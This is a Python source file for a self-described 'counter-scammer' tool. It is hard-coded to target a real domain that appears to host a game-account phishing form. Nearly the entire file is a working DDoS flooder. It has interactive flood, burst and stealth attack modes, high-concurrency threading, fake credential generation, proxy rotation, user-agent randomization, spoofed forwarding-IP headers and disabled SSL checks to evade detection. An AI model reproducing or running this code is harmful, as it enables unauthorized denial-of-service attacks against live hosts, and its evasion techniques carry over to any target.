import requests
import urllib.parse
from typing import Dict, Optional, List
import json
import random
import string
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
import warnings

# Suppress SSL warnings for stealth mode
warnings.filterwarnings('ignore', category=InsecureRequestWarning)

# Add parent directory to path to import custom UserAgent
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from UserAgent.user_agent import UserAgent as CustomUserAgent


class CounterScammer:
    """
    Advanced counter-scammer tool with DDoS capabilities and anti-detection features.
    """
    
    def __init__(self, stealth_mode: bool = True):
        """Initialize the CounterScammer with advanced security features."""
        self.base_url = "https://join.yimicargo.de"
        self.endpoint = "/xyzlenzz.php"
        self.referer_url = "https://join.yimicargo.de/ress.php"
        self.stealth_mode = stealth_mode
        
        # Initialize custom user agent
        self.user_agent_list = CustomUserAgent.get_user_agents()
        
        # Session pool for connection reuse and better performance
        self.session_pool = []
        self.max_sessions = 20
        self._init_session_pool()
        
        # Advanced headers with anti-detection
        self.base_headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "dnt": "1",
            "origin": "https://join.yimicargo.de",
            "pragma": "no-cache",
            "referer": self.referer_url,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "x-requested-with": "XMLHttpRequest"
        }
        
        # Proxy configuration for anonymity
        self.proxy_list = self._load_proxy_list() if stealth_mode else []
        self.current_proxy_index = 0
        
        # Rate limiting and timing randomization
        self.min_delay = 0.001
        self.max_delay = 0.005
        self.request_variance = 0.002
        
        # Login types and their corresponding form data templates
        self.login_types = {
            "moonton": {
                "email": "jokowi@gmail.com",
                "password": "sdfsdfsd",
                "pass": "sfdsfdsfds",
                "login": "Moonton",
                "playid": "23423423423",
                "codetel": "",
                "server": "23432",
                "phone": "rs2342423423423",
                "level": "4",
                "points": "Renowned Collector"
            },
            "google": {
                "email": "123@gmail.com",
                "password": "123123123",
                "pass": "",
                "login": "Google Play",
                "playid": "123123123",
                "codetel": "",
                "server": "123",
                "phone": "123123123",
                "level": "200",
                "points": "World Collector"
            }
        }
        
        # Default form data template (Moonton)
        self.default_form_data = self.login_types["moonton"].copy()
        
        # Statistics tracking
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'bytes_sent': 0,
            'start_time': None,
            'end_time': None
        }
    
    def _init_session_pool(self):
        """Initialize a pool of HTTP sessions for better performance."""
        for _ in range(self.max_sessions):
            session = requests.Session()
            session.verify = False  # Ignore SSL verification for stealth
            session.timeout = (5, 10)  # Connection and read timeout
            
            # Configure session for better performance
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=10,
                pool_maxsize=20,
                max_retries=0
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            
            self.session_pool.append(session)
    
    def _load_proxy_list(self) -> List[Dict]:
        """Load proxy list for anonymity (implement your proxy source here)."""
        # Example proxy list - replace with your actual proxy sources
        proxy_examples = [
            # Add your proxy servers here in format:
            # {"http": "http://proxy1:port", "https": "https://proxy1:port"},
            # {"http": "http://proxy2:port", "https": "https://proxy2:port"},
        ]
        return proxy_examples
    
    def _get_random_session(self) -> requests.Session:
        """Get a random session from the pool."""
        return random.choice(self.session_pool)
    
    def _get_next_proxy(self) -> Optional[Dict]:
        """Get next proxy in rotation."""
        if not self.proxy_list:
            return None
        
        proxy = self.proxy_list[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
        return proxy
    
    def _generate_fingerprint_headers(self) -> Dict[str, str]:
        """Generate randomized headers to avoid fingerprinting."""
        headers = self.base_headers.copy()
        
        # Randomize user agent
        headers['user-agent'] = random.choice(self.user_agent_list)
        
        # Add fake client hints
        chrome_versions = ["138", "137", "136", "135"]
        version = random.choice(chrome_versions)
        headers['sec-ch-ua'] = f'"Not)A;Brand";v="8", "Chromium";v="{version}", "Google Chrome";v="{version}"'
        
        # Random platform
        platforms = ['"Windows"', '"macOS"', '"Linux"']
        headers['sec-ch-ua-platform'] = random.choice(platforms)
        
        # Add fake forwarded headers for IP spoofing
        headers['X-Forwarded-For'] = self.generate_fake_ip()
        headers['X-Real-IP'] = self.generate_fake_ip()
        headers['X-Originating-IP'] = self.generate_fake_ip()
        headers['X-Remote-IP'] = self.generate_fake_ip()
        headers['X-Remote-Addr'] = self.generate_fake_ip()
        headers['X-Client-IP'] = self.generate_fake_ip()
        
        # Randomize other headers
        if random.choice([True, False]):
            headers['Connection'] = random.choice(['keep-alive', 'close'])
        
        if random.choice([True, False]):
            headers['Upgrade-Insecure-Requests'] = "1"
        
        return headers
    
    def _add_timing_variance(self):
        """Add random timing variance to avoid pattern detection."""
        variance = random.uniform(-self.request_variance, self.request_variance)
        time.sleep(max(0, self.min_delay + variance))
    
    def update_headers(self, custom_headers: Dict[str, str]) -> None:
        """
        Update the default headers with custom values.
        
        Args:
            custom_headers (Dict[str, str]): Dictionary of custom headers to update
        """
        self.headers.update(custom_headers)
    
    def update_form_data(self, custom_data: Dict[str, str]) -> None:
        """
        Update the default form data with custom values.
        
        Args:
            custom_data (Dict[str, str]): Dictionary of custom form data to update
        """
        self.default_form_data.update(custom_data)
    
    def send_request(self, form_data: Optional[Dict[str, str]] = None, 
                    custom_headers: Optional[Dict[str, str]] = None,
                    use_proxy: bool = None) -> requests.Response:
        """
        Send POST request to the target endpoint with advanced evasion.
        
        Args:
            form_data (Optional[Dict[str, str]]): Custom form data, uses default if None
            custom_headers (Optional[Dict[str, str]]): Custom headers to add/override
            use_proxy (bool): Whether to use proxy (None = auto-decide based on stealth_mode)
            
        Returns:
            requests.Response: The response object from the request
        """
        # Use provided form data or default
        data_to_send = form_data if form_data is not None else self.default_form_data.copy()
        
        # Generate fingerprint-resistant headers
        headers_to_use = self._generate_fingerprint_headers()
        if custom_headers:
            headers_to_use.update(custom_headers)
        
        # Get session from pool
        session = self._get_random_session()
        
        # Configure proxy if needed
        proxies = None
        if use_proxy is None:
            use_proxy = self.stealth_mode
        
        if use_proxy and self.proxy_list:
            proxies = self._get_next_proxy()
        
        # Construct full URL
        full_url = f"{self.base_url}{self.endpoint}"
        
        # Add timing variance for stealth
        if self.stealth_mode:
            self._add_timing_variance()
        
        try:
            # Calculate request size for statistics
            request_size = len(urllib.parse.urlencode(data_to_send).encode('utf-8'))
            self.stats['bytes_sent'] += request_size
            self.stats['total_requests'] += 1
            
            # Send POST request with all evasion techniques
            response = session.post(
                url=full_url,
                data=data_to_send,
                headers=headers_to_use,
                proxies=proxies,
                timeout=(3, 7),  # (connection, read) timeout for DDoS effectiveness
                allow_redirects=False,  # Don't follow redirects for speed
                stream=False,  # Don't stream for speed
                verify=False  # Ignore SSL for stealth
            )
            
            # Update statistics
            if response.status_code == 200:
                self.stats['successful_requests'] += 1
            else:
                self.stats['failed_requests'] += 1
            
            return response
            
        except requests.exceptions.RequestException as e:
            self.stats['failed_requests'] += 1
            # In DDoS mode, we don't want to stop on errors
            if self.stealth_mode:
                # Create a dummy response for failed requests
                dummy_response = requests.Response()
                dummy_response.status_code = 0
                dummy_response._content = str(e).encode()
                return dummy_response
            else:
                raise
    
    def send_multiple_requests(self, requests_data: list, delay: float = 1.0) -> list:
        """
        Send multiple requests with optional delay between them.
        
        Args:
            requests_data (list): List of dictionaries containing form_data and optional headers
            delay (float): Delay in seconds between requests
            
        Returns:
            list: List of response objects
        """
        
        responses = []
        for i, request_info in enumerate(requests_data):
            form_data = request_info.get('form_data')
            custom_headers = request_info.get('headers')
            
            print(f"Sending request {i+1}/{len(requests_data)}...")
            response = self.send_request(form_data, custom_headers)
            responses.append(response)
            
            # Add delay between requests (except for the last one)
            if i < len(requests_data) - 1:
                time.sleep(delay)
        
        return responses
    
    def print_response_info(self, response: requests.Response) -> None:
        """
        Print useful information about the response.
        
        Args:
            response (requests.Response): The response object to analyze
        """
        print(f"Status Code: {response.status_code}")
        print(f"Response URL: {response.url}")
        print(f"Response Headers: {dict(response.headers)}")
        print(f"Response Text: {response.text[:500]}...")  # First 500 chars
        
    def generate_fake_ip(self) -> str:
        """
        Generate a realistic fake IP address avoiding reserved ranges.
        
        Returns:
            str: A realistic fake IP address
        """
        # Avoid reserved IP ranges for more realistic IPs
        while True:
            ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            # Avoid reserved ranges
            first_octet = int(ip.split('.')[0])
            if first_octet not in [10, 127, 169, 172, 192, 224, 240]:
                return ip
    
    def get_random_user_agent(self) -> str:
        """
        Get a random user agent from the custom UserAgent list.
        
        Returns:
            str: A random user agent string
        """
        return random.choice(self.user_agent_list)
    
    def generate_fake_email(self, provider: str = None) -> str:
        """
        Generate a realistic fake email address.
        
        Args:
            provider (str): Email provider (gmail, yahoo, outlook, etc.)
            
        Returns:
            str: A realistic fake email address
        """
        providers = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com", 
                    "icloud.com", "mail.com", "yandex.com", "tutanota.com"]
        if provider is None:
            provider = random.choice(providers)
        
        # Generate more realistic usernames
        name_patterns = [
            lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))),
            lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7))) + 
                   ''.join(random.choices(string.digits, k=random.randint(2, 4))),
            lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) + 
                   random.choice(['_', '.', '']) + 
                   ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))),
        ]
        
        username = random.choice(name_patterns)()
        return f"{username}@{provider}"
    
    def generate_fake_phone(self, prefix: str = "0") -> str:
        """
        Generate a realistic fake phone number.
        
        Args:
            prefix (str): Phone number prefix (default "0" for Indonesian format)
            
        Returns:
            str: A realistic fake phone number
        """
        if prefix == "0":
            # Indonesian mobile prefixes: 08xx
            mobile_prefixes = ['11', '12', '13', '14', '15', '16', '17', '18', '19', 
                             '21', '22', '31', '32', '33', '38', '51', '52', '53', 
                             '55', '56', '57', '58', '59', '77', '78', '81', '82', 
                             '83', '85', '87', '88', '89', '95', '96', '97', '98', '99']
            second_third = random.choice(mobile_prefixes)
            remaining_digits = ''.join(random.choices(string.digits, k=random.randint(6, 8)))
            return f"08{second_third}{remaining_digits}"
        else:
            return prefix + ''.join(random.choices(string.digits, k=random.randint(10, 15)))
    
    def generate_fake_data_by_type(self, login_type: str = "moonton", custom_email: str = None) -> Dict[str, str]:
        """
        Generate fake form data based on login type (moonton or google).
        
        Args:
            login_type (str): Type of login ("moonton" or "google")
            custom_email (str): Custom email to use
            
        Returns:
            Dict[str, str]: Generated fake form data
        """
        if login_type.lower() not in self.login_types:
            login_type = "moonton"
        
        base_data = self.login_types[login_type.lower()].copy()
        
        # Generate fake email
        if custom_email:
            base_data['email'] = custom_email
        else:
            base_data['email'] = self.generate_fake_email()
        
        # Generate fake password
        base_data['password'] = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 12)))
        
        # Generate fake data based on login type
        if login_type.lower() == "moonton":
            # For Moonton, password and pass must be the same
            fake_password = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 12)))
            base_data['password'] = fake_password
            base_data['pass'] = fake_password  # Same as password for Moonton
            
            base_data['playid'] = ''.join(random.choices(string.digits, k=random.randint(10, 12)))
            base_data['server'] = ''.join(random.choices(string.digits, k=random.randint(4, 6)))  # 4-6 digits
            base_data['phone'] = self.generate_fake_phone("0")  # Must start with 0
            base_data['level'] = str(random.randint(1, 50))
            
            # Specific points for Moonton
            moonton_points = [
                "Amateur Collector", "Junior Collector", "Seasoned Collector", 
                "Expert Collector", "Renowned Collector", "Exalted Collector", 
                "Mega Collector", "World Collector"
            ]
            base_data['points'] = random.choice(moonton_points)
            
        elif login_type.lower() == "google":
            base_data['pass'] = ""  # Google Play usually has empty pass field
            base_data['playid'] = ''.join(random.choices(string.digits, k=random.randint(8, 10)))
            base_data['server'] = ''.join(random.choices(string.digits, k=random.randint(3, 5)))
            base_data['phone'] = ''.join(random.choices(string.digits, k=random.randint(10, 12)))
            base_data['level'] = str(random.randint(50, 300))
            
            # Random points for Google Play
            google_points = [
                "World Collector", "Global Collector", "Universe Collector",
                "Galaxy Collector", "Supreme Collector", "Ultimate Collector"
            ]
            base_data['points'] = random.choice(google_points)
        
        return base_data
    
    def generate_random_headers(self) -> Dict[str, str]:
        """
        Generate headers with advanced anti-detection features.
        
        Returns:
            Dict[str, str]: Headers with randomized fingerprint-resistant values
        """
        return self._generate_fingerprint_headers()
    
    def perform_ddos_attack(self, rps: int, duration: int, login_types: List[str], 
                          show_progress: bool = True) -> Dict:
        """
        Perform a professional DDoS attack with advanced evasion techniques.
        
        Args:
            rps (int): Requests per second
            duration (int): Attack duration in seconds
            login_types (List[str]): List of login types to use
            show_progress (bool): Whether to show attack progress
            
        Returns:
            Dict: Attack statistics and results
        """
        self.stats['start_time'] = time.time()
        total_requests = rps * duration
        
        if show_progress:
            print(f"🚀 Initiating DDoS attack: {rps} RPS for {duration} seconds")
            print(f"🎯 Target: {self.base_url}{self.endpoint}")
            print(f"📊 Total payload: {total_requests} requests")
            print(f"🛡️  Stealth mode: {'ENABLED' if self.stealth_mode else 'DISABLED'}")
            print(f"🔄 Proxy rotation: {'ENABLED' if self.proxy_list else 'DISABLED'}")
            print("=" * 60)
        
        # Pre-generate all request data for maximum speed
        requests_data = []
        for i in range(total_requests):
            login_type = random.choice(login_types)
            fake_data = self.generate_fake_data_by_type(login_type)
            requests_data.append({
                'form_data': fake_data,
                'login_type': login_type
            })
        
        responses = []
        successful_requests = 0
        failed_requests = 0
        bytes_transferred = 0
        
        def execute_request_burst(batch_requests, batch_num):
            """Execute a burst of concurrent requests."""
            batch_results = []
            
            def send_single_request(request_info, request_index):
                try:
                    form_data = request_info['form_data']
                    
                    # Add some randomization to avoid pattern detection
                    if self.stealth_mode:
                        delay = random.uniform(0, 0.1)  # Random micro-delay
                        time.sleep(delay)
                    
                    response = self.send_request(form_data)
                    
                    return {
                        'index': request_index,
                        'response': response,
                        'success': response.status_code == 200,
                        'form_data': form_data,
                        'size': len(response.content) if response.content else 0
                    }
                except Exception as e:
                    return {
                        'index': request_index,
                        'response': None,
                        'success': False,
                        'form_data': request_info['form_data'],
                        'error': str(e),
                        'size': 0
                    }
            
            # Use ThreadPoolExecutor for maximum concurrency
            max_workers = min(100, len(batch_requests) * 2)  # Aggressive threading
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_request = {
                    executor.submit(send_single_request, req, i): (i, req)
                    for i, req in enumerate(batch_requests)
                }
                
                for future in as_completed(future_to_request):
                    result = future.result()
                    batch_results.append(result)
                    
                    if show_progress and result['success']:
                        form_data = result['form_data']
                        print(f"💥 [{len(batch_results)}/{len(batch_requests)}] {form_data['login']} - {form_data['email']}")
            
            return batch_results
        
        # Execute attack in batches (1 second intervals)
        for batch_num in range(duration):
            batch_start_time = time.time()
            
            # Get requests for this batch
            batch_start_index = batch_num * rps
            batch_end_index = min(batch_start_index + rps, len(requests_data))
            batch_requests = requests_data[batch_start_index:batch_end_index]
            
            if not batch_requests:
                break
            
            if show_progress:
                print(f"\n⚡ Batch {batch_num + 1}/{duration}: Launching {len(batch_requests)} concurrent attacks...")
            
            # Execute the batch
            batch_results = execute_request_burst(batch_requests, batch_num)
            
            # Process results
            for result in batch_results:
                if result['success']:
                    successful_requests += 1
                    if result['response']:
                        responses.append(result['response'])
                        bytes_transferred += result['size']
                else:
                    failed_requests += 1
            
            # Maintain timing (but don't wait too long)
            batch_elapsed = time.time() - batch_start_time
            if batch_elapsed < 1.0 and batch_num < duration - 1:
                sleep_time = min(0.8, 1.0 - batch_elapsed)  # Cap sleep time
                time.sleep(sleep_time)
        
        self.stats['end_time'] = time.time()
        total_time = self.stats['end_time'] - self.stats['start_time']
        actual_rps = total_requests / total_time if total_time > 0 else 0
        
        # Final statistics
        attack_stats = {
            'total_requests': total_requests,
            'successful_requests': successful_requests,
            'failed_requests': failed_requests,
            'success_rate': (successful_requests / total_requests) * 100 if total_requests > 0 else 0,
            'total_time': total_time,
            'actual_rps': actual_rps,
            'target_rps': rps,
            'bytes_sent': self.stats['bytes_sent'],
            'bytes_received': bytes_transferred,
            'total_bandwidth': self.stats['bytes_sent'] + bytes_transferred,
            'responses': responses[:10]  # Keep only first 10 responses for analysis
        }
        
        if show_progress:
            self._display_attack_summary(attack_stats)
        
        return attack_stats
    
    def _display_attack_summary(self, stats: Dict):
        """Display professional attack summary."""
        print(f"\n{'='*60}")
        print(f"🎯 DDOS ATTACK COMPLETED")
        print(f"{'='*60}")
        print(f"📊 Requests sent: {stats['total_requests']:,}")
        print(f"✅ Successful: {stats['successful_requests']:,} ({stats['success_rate']:.1f}%)")
        print(f"❌ Failed: {stats['failed_requests']:,}")
        print(f"⏱️  Duration: {stats['total_time']:.2f} seconds")
        print(f"⚡ Actual RPS: {stats['actual_rps']:.1f} req/s")
        print(f"🎯 Target RPS: {stats['target_rps']} req/s")
        print(f"📤 Data sent: {stats['bytes_sent']:,} bytes ({stats['bytes_sent']/1024/1024:.2f} MB)")
        print(f"📥 Data received: {stats['bytes_received']:,} bytes ({stats['bytes_received']/1024/1024:.2f} MB)")
        print(f"🌐 Total bandwidth: {stats['total_bandwidth']:,} bytes ({stats['total_bandwidth']/1024/1024:.2f} MB)")
        print(f"{'='*60}")
        
        # Performance rating
        efficiency = min(100, (stats['actual_rps'] / stats['target_rps']) * 100)
        if efficiency >= 90:
            rating = "🔥 EXCELLENT"
        elif efficiency >= 75:
            rating = "👍 GOOD"
        elif efficiency >= 50:
            rating = "⚠️  FAIR"
        else:
            rating = "❌ POOR"
        
        print(f"🏆 Attack efficiency: {efficiency:.1f}% - {rating}")
        print(f"{'='*60}")
    
    def close_sessions(self):
        """Close all HTTP sessions to clean up resources."""
        for session in self.session_pool:
            session.close()
    
    def send_concurrent_requests(self, requests_data: list, rps: int, duration: int) -> list:
        """
        Send multiple requests concurrently to achieve target RPS.
        
        Args:
            requests_data (list): List of dictionaries containing form_data and headers
            rps (int): Target requests per second
            duration (int): Duration in seconds
            
        Returns:
            list: List of response objects
        """
        responses = []
        successful_requests = 0
        failed_requests = 0
        request_times = []
        
        def send_single_request(request_info, request_index):
            """Send a single request and return the result."""
            try:
                form_data = request_info['form_data']
                custom_headers = request_info['headers']
                login_type = request_info['login_type']
                
                start_time = time.time()
                response = self.send_request(form_data, custom_headers)
                end_time = time.time()
                
                return {
                    'index': request_index,
                    'response': response,
                    'success': response.status_code == 200,
                    'form_data': form_data,
                    'login_type': login_type,
                    'request_time': end_time - start_time
                }
            except Exception as e:
                return {
                    'index': request_index,
                    'response': None,
                    'success': False,
                    'form_data': request_info['form_data'],
                    'login_type': request_info['login_type'],
                    'error': str(e),
                    'request_time': 0
                }
        
        # Calculate batch size and intervals
        batch_interval = 1.0  # Send batches every second
        requests_per_batch = rps
        total_batches = duration
        
        print(f"Sending {requests_per_batch} requests per second for {duration} seconds...")
        print(f"Total batches: {total_batches}, Requests per batch: {requests_per_batch}")
        
        start_time = time.time()
        
        for batch_num in range(total_batches):
            batch_start_time = time.time()
            
            # Get requests for this batch
            batch_start_index = batch_num * requests_per_batch
            batch_end_index = min(batch_start_index + requests_per_batch, len(requests_data))
            batch_requests = requests_data[batch_start_index:batch_end_index]
            
            if not batch_requests:
                break
            
            print(f"\nBatch {batch_num + 1}/{total_batches}: Sending {len(batch_requests)} requests...")
            
            # Use ThreadPoolExecutor to send requests concurrently
            with ThreadPoolExecutor(max_workers=min(50, len(batch_requests))) as executor:
                # Submit all requests in this batch
                future_to_request = {
                    executor.submit(send_single_request, req, batch_start_index + i): (batch_start_index + i, req)
                    for i, req in enumerate(batch_requests)
                }
                
                # Collect results as they complete
                batch_results = []
                for future in as_completed(future_to_request):
                    result = future.result()
                    batch_results.append(result)
                    
                    # Show progress for this batch
                    form_data = result['form_data']
                    index = result['index']
                    print(f"[{index + 1}/{len(requests_data)}] {form_data['login']} - {form_data['email']} - {form_data['password']} - {form_data['pass']} - {form_data['phone']} - {form_data['points']}")
                
                # Process batch results
                for result in batch_results:
                    if result['success']:
                        successful_requests += 1
                        responses.append(result['response'])
                    else:
                        failed_requests += 1
                        if result['response']:
                            responses.append(result['response'])
                    
                    if 'request_time' in result:
                        request_times.append(result['request_time'])
            
            # Wait for next batch (maintain 1-second intervals)
            batch_elapsed = time.time() - batch_start_time
            if batch_elapsed < batch_interval and batch_num < total_batches - 1:
                sleep_time = batch_interval - batch_elapsed
                time.sleep(sleep_time)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        return {
            'responses': responses,
            'successful_requests': successful_requests,
            'failed_requests': failed_requests,
            'total_time': total_time,
            'request_times': request_times,
            'actual_rps': len(requests_data) / total_time if total_time > 0 else 0
        }


# Example usage and testing functions
def test_single_request():
    """Test sending a single request."""
    scammer = CounterScammer()
    
    print("Sending single request...")
    response = scammer.send_request()
    scammer.print_response_info(response)
    

def test_multiple_requests():
    """Test sending multiple requests with different data."""
    scammer = CounterScammer()
    
    # Prepare multiple requests with different data
    requests_data = []
    for i in range(3):
        fake_data = scammer.generate_fake_data_by_type("moonton")
        fake_headers = scammer.generate_random_headers()
        requests_data.append({'form_data': fake_data, 'headers': fake_headers})
    
    print("Sending multiple requests...")
    responses = scammer.send_multiple_requests(requests_data, delay=2.0)
    
    for i, response in enumerate(responses):
        print(f"\n--- Response {i+1} ---")
        scammer.print_response_info(response)


def test_custom_data():
    """Test sending request with custom data."""
    scammer = CounterScammer()
    
    custom_data = {
        "email": "custom@example.com",
        "password": "custompass123",
        "pass": "custompass456",
        "login": "CustomLogin",
        "playid": "999999999999",
        "server": "99999",
        "phone": "rs999999999999999",
        "level": "99",
        "points": "Custom Collector"
    }
    
    print("Sending request with custom data...")
    response = scammer.send_request(form_data=custom_data)
    scammer.print_response_info(response)


def test_google_vs_moonton():
    """Test sending requests with both Google Play and Moonton login types."""
    scammer = CounterScammer()
    
    print("Testing Google Play login type:")
    google_data = scammer.generate_fake_data_by_type("google")
    google_headers = scammer.generate_random_headers()
    print(f"Generated Google data: {google_data}")
    
    response_google = scammer.send_request(form_data=google_data, custom_headers=google_headers)
    scammer.print_response_info(response_google)
    
    time.sleep(2)
    
    print("\n" + "="*50)
    print("Testing Moonton login type:")
    moonton_data = scammer.generate_fake_data_by_type("moonton")
    moonton_headers = scammer.generate_random_headers()
    print(f"Generated Moonton data: {moonton_data}")
    
    response_moonton = scammer.send_request(form_data=moonton_data, custom_headers=moonton_headers)
    scammer.print_response_info(response_moonton)


def test_mass_attack():
    """Test sending multiple requests with random data to simulate a counter-attack."""
    scammer = CounterScammer()
    
    num_requests = 10
    login_types = ["google", "moonton"]
    
    print(f"Starting mass counter-attack with {num_requests} requests...")
    
    requests_data = []
    for i in range(num_requests):
        # Randomly choose login type
        login_type = random.choice(login_types)
        
        # Generate fake data and headers
        fake_data = scammer.generate_fake_data_by_type(login_type)
        fake_headers = scammer.generate_random_headers()
        
        requests_data.append({
            'form_data': fake_data,
            'headers': fake_headers
        })
        
        print(f"Request {i+1}: {login_type} login with email {fake_data['email']}")
    
    print("\nExecuting requests...")
    responses = scammer.send_multiple_requests(requests_data, delay=1.5)
    
    # Summary
    successful_requests = sum(1 for r in responses if r.status_code == 200)
    print(f"\nSummary:")
    print(f"Total requests: {len(responses)}")
    print(f"Successful requests (200): {successful_requests}")
    print(f"Failed requests: {len(responses) - successful_requests}")


def generate_and_show_fake_data():
    """Generate and display various fake data samples."""
    scammer = CounterScammer()
    
    print("=== FAKE DATA GENERATOR ===")
    
    print("\n1. Random User Agents:")
    for i in range(3):
        print(f"   {i+1}. {scammer.get_random_user_agent()}")
    
    print("\n2. Random IP Addresses:")
    for i in range(5):
        print(f"   {i+1}. {scammer.generate_fake_ip()}")
    
    print("\n3. Random Email Addresses:")
    for i in range(5):
        print(f"   {i+1}. {scammer.generate_fake_email()}")
    
    print("\n4. Random Phone Numbers:")
    for i in range(5):
        print(f"   {i+1}. {scammer.generate_fake_phone('0')}")  # With 0 prefix
    
    print("\n5. Google Play Login Data:")
    google_data = scammer.generate_fake_data_by_type("google")
    for key, value in google_data.items():
        print(f"   {key}: {value}")
    
    print("\n6. Moonton Login Data:")
    moonton_data = scammer.generate_fake_data_by_type("moonton")
    for key, value in moonton_data.items():
        print(f"   {key}: {value}")


def interactive_counter_attack():
    """Interactive menu for professional counter-attack operations."""
    print("🛡️  PROFESSIONAL COUNTER-SCAMMER TOOL")
    print("=" * 60)
    print("⚡ Advanced DDoS Attack System")
    print("🔒 Military-Grade Stealth Technology")
    print("🌐 Multi-Vector Attack Capabilities")
    print("=" * 60)
    
    # Initialize with stealth mode
    scammer = CounterScammer(stealth_mode=True)
    
    try:
        # Attack mode selection
        print("\n🎯 SELECT ATTACK MODE:")
        print("1 - 📈 Escalating Attack (Low → High intensity)")
        print("2 - ⚡ Burst Attack (High intensity)")
        print("3 - 🌊 Flood Attack (Sustained high RPS)")
        print("4 - 🎭 Stealth Attack (Low intensity, high duration)")
        
        while True:
            try:
                mode = int(input("\nEnter attack mode (1-4): "))
                if mode in [1, 2, 3, 4]:
                    break
                else:
                    print("❌ Please enter 1, 2, 3, or 4.")
            except ValueError:
                print("❌ Please enter a valid number.")
        
        # Configure attack parameters based on mode
        if mode == 1:  # Escalating Attack
            print("\n📈 ESCALATING ATTACK CONFIGURATION")
            start_rps = int(input("Starting RPS (e.g., 10): "))
            end_rps = int(input("Ending RPS (e.g., 200): "))
            duration = int(input("Total duration in seconds (e.g., 30): "))
            
            rps_increment = (end_rps - start_rps) // duration
            attack_plan = [(start_rps + i * rps_increment, 1) for i in range(duration)]
            
        elif mode == 2:  # Burst Attack
            print("\n⚡ BURST ATTACK CONFIGURATION")
            rps = int(input("RPS intensity (e.g., 500): "))
            duration = int(input("Burst duration in seconds (e.g., 10): "))
            attack_plan = [(rps, duration)]
            
        elif mode == 3:  # Flood Attack
            print("\n🌊 FLOOD ATTACK CONFIGURATION")
            rps = int(input("Sustained RPS (e.g., 300): "))
            duration = int(input("Flood duration in seconds (e.g., 60): "))
            attack_plan = [(rps, duration)]
            
        else:  # Stealth Attack
            print("\n🎭 STEALTH ATTACK CONFIGURATION")
            rps = int(input("Low RPS (e.g., 50): "))
            duration = int(input("Duration in seconds (e.g., 120): "))
            attack_plan = [(rps, duration)]
        
        # Login type selection
        print("\n🎮 SELECT TARGET LOGIN TYPES:")
        print("0 - 🎯 Mixed (Moonton + Google Play)")
        print("1 - 🎮 Moonton only")
        print("2 - 📱 Google Play only")
        
        while True:
            try:
                choice = int(input("Enter choice (0-2): "))
                if choice in [0, 1, 2]:
                    break
                else:
                    print("❌ Please enter 0, 1, or 2.")
            except ValueError:
                print("❌ Please enter a valid number.")
        
        # Map choice to login types
        if choice == 0:
            login_types = ["moonton", "google"]
            choice_name = "Mixed (Moonton + Google Play)"
        elif choice == 1:
            login_types = ["moonton"]
            choice_name = "Moonton only"
        else:
            login_types = ["google"]
            choice_name = "Google Play only"
        
        # Display attack configuration
        total_requests = sum(rps * dur for rps, dur in attack_plan)
        total_duration = sum(dur for _, dur in attack_plan)
        
        print(f"\n{'='*60}")
        print(f"🚀 ATTACK CONFIGURATION")
        print(f"{'='*60}")
        print(f"🎯 Target: {scammer.base_url}")
        print(f"🎮 Login types: {choice_name}")
        print(f"📊 Total requests: {total_requests:,}")
        print(f"⏱️  Total duration: {total_duration} seconds")
        print(f"⚡ Attack pattern: {len(attack_plan)} phase(s)")
        for i, (rps, dur) in enumerate(attack_plan, 1):
            print(f"   Phase {i}: {rps} RPS for {dur}s")
        print(f"🛡️  Stealth mode: ENABLED")
        print(f"🔄 Anti-detection: ENABLED")
        print(f"{'='*60}")
        
        # Final confirmation
        confirm = input("\n⚠️  INITIATE ATTACK? (type 'ATTACK' to confirm): ")
        if confirm.upper() != 'ATTACK':
            print("❌ Attack cancelled.")
            return
        
        print(f"\n🚨 ATTACK INITIATED!")
        print(f"{'='*60}")
        
        # Execute attack phases
        total_stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'total_time': 0,
            'total_bandwidth': 0
        }
        
        for phase_num, (rps, duration) in enumerate(attack_plan, 1):
            print(f"\n🔥 PHASE {phase_num}/{len(attack_plan)}: {rps} RPS for {duration}s")
            print("-" * 40)
            
            phase_stats = scammer.perform_ddos_attack(
                rps=rps,
                duration=duration,
                login_types=login_types,
                show_progress=True
            )
            
            # Accumulate statistics
            total_stats['total_requests'] += phase_stats['total_requests']
            total_stats['successful_requests'] += phase_stats['successful_requests']
            total_stats['failed_requests'] += phase_stats['failed_requests']
            total_stats['total_time'] += phase_stats['total_time']
            total_stats['total_bandwidth'] += phase_stats['total_bandwidth']
            
            # Short pause between phases
            if phase_num < len(attack_plan):
                print("\n⏸️  Phase transition (2s pause)...")
                time.sleep(2)
        
        # Final summary
        print(f"\n{'='*60}")
        print(f"🏆 MISSION ACCOMPLISHED")
        print(f"{'='*60}")
        print(f"📊 Total requests: {total_stats['total_requests']:,}")
        print(f"✅ Successful hits: {total_stats['successful_requests']:,}")
        print(f"❌ Failed attempts: {total_stats['failed_requests']:,}")
        success_rate = (total_stats['successful_requests'] / total_stats['total_requests']) * 100
        print(f"🎯 Success rate: {success_rate:.1f}%")
